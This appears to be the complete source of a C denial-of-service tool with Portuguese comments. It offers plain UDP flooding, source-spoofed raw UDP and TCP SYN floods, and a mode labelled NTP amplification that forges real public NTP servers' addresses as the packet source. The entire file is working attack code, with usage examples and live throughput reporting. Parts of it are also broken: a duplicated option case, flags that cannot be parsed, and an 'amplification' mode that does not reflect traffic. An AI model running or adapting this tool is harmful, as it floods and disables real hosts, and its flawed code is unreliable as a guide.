[file name]: test.c
[file content begin]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>

#define MAX_PACKET 65535
#define DEFAULT_THREADS 10
#define DEFAULT_SIZE 1400
#define MAX_THREADS 100
#define SOCKETS_PER_THREAD 4
#define NTP_PORT 123

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
    int use_raw;
    int use_ntp;
} attack_args_t;

volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;

// Lista de servidores NTP públicos para spoofing
const char *ntp_servers[] = {
    "0.pool.ntp.org",
    "1.pool.ntp.org",
    "2.pool.ntp.org",
    "3.pool.ntp.org",
    "time.google.com",
    "time.windows.com",
    "time.apple.com",
    "ntp.ubuntu.com",
    "pool.ntp.org",
    "0.ntp.pool.org",
    "1.ntp.pool.org",
    "2.ntp.pool.org",
    "3.ntp.pool.org",
    "europe.pool.ntp.org",
    "asia.pool.ntp.org",
    "north-america.pool.ntp.org",
    "south-america.pool.ntp.org",
    "africa.pool.ntp.org",
    "oceania.pool.ntp.org",
    "ntp1.aliyun.com",
    "ntp2.aliyun.com",
    "ntp.aliyun.com",
    "ntp1.tencent.com",
    "ntp2.tencent.com",
    "ntp.tencent.com",
    "ntp1.sina.com.cn",
    "ntp2.sina.com.cn",
    "ntp.sina.com.cn",
    "ntp1.163.com",
    "ntp2.163.com",
    "ntp.163.com",
    "1.cn.pool.ntp.org",
    "2.cn.pool.ntp.org",
    "3.cn.pool.ntp.org",
    "1.asia.pool.ntp.org",
    "2.asia.pool.ntp.org",
    "3.asia.pool.ntp.org",
    "0.europe.pool.ntp.org",
    "1.europe.pool.ntp.org",
    "2.europe.pool.ntp.org",
    "3.europe.pool.ntp.org",
    "ntp1-1.vanderbilt.edu",
    "ntp1-2.vanderbilt.edu",
    "ntp2-1.vanderbilt.edu",
    "ntp2-2.vanderbilt.edu",
    "ntp.your.org",
    "ntp1.lanl.gov",
    "ntp2.lanl.gov",
    "ntp3.lanl.gov",
    "time.nist.gov",
    "time-a.nist.gov",
    "time-b.nist.gov",
    "time-c.nist.gov",
    "time-d.nist.gov",
    "ntp-b.nist.gov",
    "ntp.aol.com",
    "ntp1.vanderbilt.edu",
    "ntp2.vanderbilt.edu",
    "clock.nyc.he.net",
    "clock.sjc.he.net",
    "clock.fmt.he.net",
    "clock.ord.he.net",
    "clock.ams.he.net",
    "clock.syd.he.net",
    "ntp.ripe.net",
    "ntp.bluewin.ch",
    "ntp.switch.ch",
    "ntp.tuxfamily.net",
    "ntp.ovh.net",
    "time.bora.net",
    "time.kr",
    "ntp.kr",
    "ntp.ksc.kw",
    "ntp.kornet.net",
    "ntp.tch.harvard.edu",
    "ntp0.cornell.edu",
    "ntp1.cornell.edu",
    "ntp2.cornell.edu",
    "ntp.time.com",
    "ntp.global",
    "ntp.net",
    "ntp.com",
    "time.cloudflare.com",
    "ntp.fedoraproject.org",
    "ntp.centos.org",
    "ntp.ubuntu.com",
    "ntp.debian.org",
    "ntp.archlinux.org",
    "ntp.manjaro.org",
    "time.opensuse.org",
    "ntp.suse.com",
    "ntp.redhat.com",
    "ntp.freebsd.org",
    "ntp.netbsd.org",
    "ntp.openbsd.org",
    "ntp.dragonflybsd.org",
    "ntp.illumos.org",
    "ntp.solaris.com",
    "ntp.oracle.com",
    "ntp.ibm.com",
    "ntp.hp.com",
    "ntp.dell.com",
    "ntp.cisco.com",
    "ntp.juniper.net",
    "ntp.huawei.com",
    "ntp.zte.com.cn",
    "ntp.ericsson.com",
    "ntp.nokia.com",
    "ntp.qualcomm.com",
    "ntp.intel.com",
    "ntp.amd.com",
    "ntp.nvidia.com",
    "ntp.microsoft.com"
};

const int num_ntp_servers = sizeof(ntp_servers) / sizeof(ntp_servers[0]);

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

uint32_t random_ip() {
    return (rand() & 0xFF) << 24 |
           (rand() & 0xFF) << 16 |
           (rand() & 0xFF) << 8 |
           (rand() & 0xFF);
}

// Estrutura do pacote NTP
struct ntp_packet {
    uint8_t li_vn_mode;
    uint8_t stratum;
    uint8_t poll;
    uint8_t precision;
    uint32_t root_delay;
    uint32_t root_dispersion;
    uint32_t reference_identifier;
    uint64_t reference_timestamp_sec;
    uint64_t reference_timestamp_frac;
    uint64_t originate_timestamp_sec;
    uint64_t originate_timestamp_frac;
    uint64_t receive_timestamp_sec;
    uint64_t receive_timestamp_frac;
    uint64_t transmit_timestamp_sec;
    uint64_t transmit_timestamp_frac;
};

void build_ntp_packet(unsigned char *buffer, int size) {
    struct ntp_packet *ntp = (struct ntp_packet *)buffer;
    
    // LI=0, VN=4, Mode=3 (client)
    ntp->li_vn_mode = 0x1b;
    ntp->stratum = 2;
    ntp->poll = 10;
    ntp->precision = 0xfa; // -6
    ntp->root_delay = htonl(0x0000);
    ntp->root_dispersion = htonl(0x0000);
    ntp->reference_identifier = htonl(0x4e54504d); // "NTPM"
    
    // Preenche timestamps com dados aleatórios
    ntp->reference_timestamp_sec = htonl(time(NULL) + rand() % 1000);
    ntp->reference_timestamp_frac = htonl(rand());
    ntp->originate_timestamp_sec = htonl(time(NULL) + rand() % 1000);
    ntp->originate_timestamp_frac = htonl(rand());
    ntp->receive_timestamp_sec = htonl(time(NULL) + rand() % 1000);
    ntp->receive_timestamp_frac = htonl(rand());
    ntp->transmit_timestamp_sec = htonl(time(NULL) + rand() % 1000);
    ntp->transmit_timestamp_frac = htonl(rand());
    
    // Preenche resto com dados aleatórios
    for (int i = sizeof(struct ntp_packet); i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

struct sockaddr_in resolve_ntp_server(const char *server) {
    struct sockaddr_in addr;
    struct hostent *host;
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(NTP_PORT);
    
    // Tenta resolver como IP primeiro
    if (inet_pton(AF_INET, server, &addr.sin_addr) <= 0) {
        host = gethostbyname(server);
        if (host != NULL && host->h_addr_list[0] != NULL) {
            memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
        } else {
            // Fallback: usa IP aleatório válido
            uint32_t ip = (10 + (rand() % 200)) << 24 |
                         (rand() & 0xFF) << 16 |
                         (rand() & 0xFF) << 8 |
                         (rand() & 0xFF);
            addr.sin_addr.s_addr = htonl(ip);
        }
    }
    
    return addr;
}

void *ntp_amplification_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;
    int server_index = 0;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket RAW para NTP: %s\n", args->thread_id, strerror(errno));
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("[Thread %d] Erro ao configurar IP_HDRINCL: %s\n", args->thread_id, strerror(errno));
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);
    // Tamanho mínimo do pacote NTP (48 bytes)
    int ntp_size = 48;
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + ntp_size;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        printf("[Thread %d] IP invalido para NTP: %s\n", args->thread_id, args->target);
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int sent_count = 0;
    int error_count = 0;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        // Usa servidor NTP real como origem (spoofing)
        struct sockaddr_in ntp_server = resolve_ntp_server(ntp_servers[server_index % num_ntp_servers]);
        server_index++;

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = ntp_server.sin_addr.s_addr; // Origem spoofed como servidor NTP
        ip_header->daddr = target_addr.sin_addr.s_addr;

        udp_header->source = htons(NTP_PORT); // Porta NTP
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + ntp_size);
        udp_header->check = 0;

        build_ntp_packet(payload, ntp_size);
        
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        } else {
            error_count++;
            if (error_count < 10) {
                printf("[Thread %d] Erro NTP sendto: %s (errno: %d)\n", 
                       args->thread_id, strerror(errno), errno);
            }
            if (errno == EPERM || errno == EACCES) {
                printf("[Thread %d] Permissao negada para NTP! Execute com sudo.\n", args->thread_id);
                break;
            }
            usleep(1000);
        }

        if (sent_count % 1000 == 0) {
            usleep(1);
        }
    }

    close(sockfd);
    printf("[Thread %d] NTP Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
    return NULL;
}

void *raw_udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket RAW: %s\n", args->thread_id, strerror(errno));
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("[Thread %d] Erro ao configurar IP_HDRINCL: %s\n", args->thread_id, strerror(errno));
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        printf("[Thread %d] IP invalido: %s\n", args->thread_id, args->target);
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int sent_count = 0;
    int error_count = 0;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        udp_header->source = htons(1024 + (rand() % 64511));
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
        udp_header->check = 0;

        random_payload(payload, args->packet_size);
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        } else {
            error_count++;
            if (error_count < 10) {
                printf("[Thread %d] Erro sendto: %s (errno: %d)\n", 
                       args->thread_id, strerror(errno), errno);
            }
            if (errno == EPERM || errno == EACCES) {
                printf("[Thread %d] Permissao negada! Execute com sudo.\n", args->thread_id);
                break;
            }
            usleep(1000);
        }

        if (sent_count % 1000 == 0) {
            usleep(1);
        }
    }

    close(sockfd);
    printf("[Thread %d] Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
    return NULL;
}

void *udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    unsigned char *packet;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket UDP: %s\n", args->thread_id, strerror(errno));
        return NULL;
    }

    int bufsize = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        printf("[Thread %d] IP invalido: %s\n", args->thread_id, args->target);
        close(sockfd);
        return NULL;
    }

    packet = malloc(args->packet_size);
    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (attack_running && time(NULL) < end_time) {
        random_payload(packet, args->packet_size);
        int result = sendto(sockfd, packet, args->packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        }
    }

    free(packet);
    close(sockfd);
    printf("[Thread %d] Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
    return NULL;
}

void *raw_tcp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    int packet_size;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket TCP: %s\n", args->thread_id, strerror(errno));
        return NULL;
    }

    int one = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = rand();
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->window = htons(65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        ip_header->check = checksum((unsigned short *)packet, packet_size);

        if (sendto(sockfd, packet, packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr)) > 0) {
            packets_sent++;
            bytes_sent += packet_size;
            sent_count++;
        }
    }

    close(sockfd);
    printf("[Thread %d] Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
    return NULL;
}

void print_stats() {
    static time_t last_print = 0;
    static unsigned long long last_packets = 0;
    static unsigned long long last_bytes = 0;
    time_t now = time(NULL);
    
    if (now - last_print >= 1) {
        unsigned long long pps = packets_sent - last_packets;
        unsigned long long bps = bytes_sent - last_bytes;
        double mbps = (bps * 8) / 1000000.0;
        double gbps = mbps / 1000.0;
        
        printf("\r[+] Pacotes: %llu | PPS: %llu | %.2f Mbps | %.3f Gbps     ",
               packets_sent, pps, mbps, gbps);
        fflush(stdout);
        last_print = now;
        last_packets = packets_sent;
        last_bytes = bytes_sent;
    }
}

void *stats_thread(void *arg) {
    while (attack_running) {
        print_stats();
        usleep(100000);
    }
    return NULL;
}

void print_usage(char *program_name) {
    printf("\n=== UDP FLOOD DOS TOOL ===\n\n");
    printf("Uso: %s <IP> <PORTA> <TEMPO> [OPCOES]\n\n", program_name);
    printf("Argumentos obrigatorios:\n");
    printf("  IP       - Endereco IP do alvo\n");
    printf("  PORTA    - Porta de destino\n");
    printf("  TEMPO    - Duracao do ataque em segundos\n\n");
    printf("Opcoes:\n");
    printf("  -t       - Numero de threads (padrao: %d)\n", DEFAULT_THREADS);
    printf("  -s       - Tamanho do pacote (padrao: %d)\n", DEFAULT_SIZE);
    printf("  -r       - Raw socket com spoofing (REQUER ROOT)\n");
    printf("  -tcp     - TCP SYN Flood (REQUER ROOT)\n");
    printf("  -ntp     - NTP Amplification Flood (REQUER ROOT)\n");
    printf("  -h       - Ajuda\n\n");
    printf("Exemplos:\n");
    printf("  %s 192.168.1.1 80 30\n", program_name);
    printf("  sudo %s 192.168.1.1 443 60 -t 20 -s 1400 -r\n", program_name);
    printf("  sudo %s 192.168.1.1 80 30 -tcp\n", program_name);
    printf("  sudo %s 192.168.1.1 123 30 -ntp -t 50\n", program_name);
    printf("\n");
}

int main(int argc, char *argv[]) {
    char *target;
    int port, duration;
    int num_threads = DEFAULT_THREADS;
    int packet_size = DEFAULT_SIZE;
    int use_raw = 0;
    int use_tcp = 0;
    int use_ntp = 0;
    int opt;

    if (argc < 4) {
        print_usage(argv[0]);
        return 1;
    }

    target = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);

    // Verifica se o IP é válido
    struct sockaddr_in test;
    if (inet_pton(AF_INET, target, &test.sin_addr) <= 0) {
        printf("Erro: IP invalido: %s\n", target);
        return 1;
    }

    optind = 4;
    while ((opt = getopt(argc, argv, "t:s:rntcp h")) != -1) {
        switch (opt) {
            case 't':
                num_threads = atoi(optarg);
                if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
                if (num_threads < 1) num_threads = 1;
                break;
            case 's':
                packet_size = atoi(optarg);
                if (packet_size > 1472) packet_size = 1472;
                if (packet_size < 64) packet_size = 64;
                break;
            case 'r':
                use_raw = 1;
                break;
            case 'n':
                use_ntp = 1;
                break;
            case 't':
                use_tcp = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // Verifica se o usuario tem permissao para raw socket
    if ((use_raw || use_tcp || use_ntp) && geteuid() != 0) {
        printf("\n[!] RAW SOCKET REQUER PERMISSAO DE ROOT!\n");
        printf("[!] Execute: sudo %s ...\n\n", argv[0]);
        return 1;
    }

    printf("\n=== INICIANDO ATAQUE ===\n");
    printf("Alvo: %s:%d\n", target, port);
    printf("Duracao: %d segundos\n", duration);
    printf("Threads: %d\n", num_threads);
    printf("Tamanho do pacote: %d bytes\n", packet_size);
    
    if (use_ntp) {
        printf("Tipo: NTP Amplification Flood\n");
        printf("Servidores NTP disponiveis: %d\n", num_ntp_servers);
    } else if (use_tcp) {
        printf("Tipo: TCP SYN Flood\n");
    } else if (use_raw) {
        printf("Tipo: UDP Raw (spoofing)\n");
    } else {
        printf("Tipo: UDP Normal\n");
    }
    printf("==========================\n\n");

    srand(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());
    signal(SIGPIPE, SIG_IGN);

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    attack_args_t *args = malloc(num_threads * sizeof(attack_args_t));

    for (int i = 0; i < num_threads; i++) {
        strncpy(args[i].target, target, sizeof(args[i].target) - 1);
        args[i].port = port;
        args[i].duration = duration;
        args[i].packet_size = packet_size;
        args[i].thread_id = i;
        args[i].use_raw = use_raw;
        args[i].use_ntp = use_ntp;

        if (use_ntp) {
            pthread_create(&threads[i], NULL, ntp_amplification_flood, &args[i]);
        } else if (use_tcp) {
            pthread_create(&threads[i], NULL, raw_tcp_flood, &args[i]);
        } else if (use_raw) {
            pthread_create(&threads[i], NULL, raw_udp_flood, &args[i]);
        } else {
            pthread_create(&threads[i], NULL, udp_flood, &args[i]);
        }
    }

    pthread_t stats_thread_id;
    pthread_create(&stats_thread_id, NULL, stats_thread, NULL);

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_cancel(stats_thread_id);
    pthread_join(stats_thread_id, NULL);

    double total_gb = (bytes_sent * 8) / 1000000000.0;

    printf("\n\n[+] Ataque finalizado!\n");
    printf("[+] Total de pacotes enviados: %llu\n", packets_sent);
    printf("[+] Total de dados enviados: %.2f GB\n", total_gb);
    if (duration > 0) {
        printf("[+] Media de PPS: %llu\n", packets_sent / duration);
        printf("[+] Media de Gbps: %.3f\n", total_gb / duration);
    }

    free(threads);
    free(args);

    return 0;
}
[file content end]
